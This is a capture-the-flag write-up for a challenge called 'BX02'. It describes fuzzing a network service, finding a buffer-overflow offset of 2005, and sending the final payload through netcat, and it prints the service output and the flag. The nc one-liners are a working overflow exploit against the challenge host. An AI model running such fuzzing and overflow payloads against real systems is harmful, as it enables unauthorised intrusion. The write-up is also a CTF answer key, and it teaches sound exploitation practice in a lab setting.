# BX02 - 100pts

## Briefing

> Access the network service at url: `cfta-bx02.allyourbases.co` port: `8013` and find a way to get the flag.

## Solution

1. It doesn't matter what input we give the service. It always tells us `DEBUG: Input length too large`. So, the first step is to see if we can find an input that is not too large. I wrote a Python [script.py](./script.py) to try every printable ascii character.

2. The [script.py](./script.py) finds that `#` is the only printable ASCII character that is considered short enough.

3. I tried sending a lot of `#`s by running `python -c "print('#'*4000)" | nc cfta-bx02.allyourbases.co 8013` and got this error `ERROR: Expected userID Variable of 1.`.

4. Maybe this service is vulnerable to a buffer overflow. Let's try to find an offset using a script similar to the one used for [BX01](../BX01/README.md). The next stage of [script.py](./script.py) does this. It keeps sending more and more `#`s until the message `ERROR: Expected userID Variable of 1` is shown. The offset is found to be `2005`.

5. A buffer overflow is successful. The final payload is: `python -c "print('#'*2005+'1'*30)" | nc cfta-bx02.allyourbases.co 8013`. The 30 `1`s is arbitrary. I tried one `1` and nothing changed so I tried 30 and it worked.

    ```
    Come Fuzz Me Bro.
    DEBUG: Waiting 100ms
    DEBUG: Waiting 100ms
    DEBUG: Waiting 100ms
    DEBUG: Waiting 100ms
    DEBUG: Waiting 100ms
    DEBUG: Waiting 100ms
    DEBUG: Waiting 100ms
    DEBUG: Waiting 100ms
    DEBUG: Waiting 100ms
    DEBUG: Waiting 100ms
    DEBUG: Waiting 100ms
    DEBUG: Waiting 100ms
    DEBUG: Waiting 100ms
    DEBUG: Waiting 100ms
    DEBUG: Input length too large.

    Flag: ThIsOneIsAbITFuZZy-6y
    DEBUG: Waiting 100ms
    ```

### Flag

`ThIsOneIsAbITFuZZy-6y`
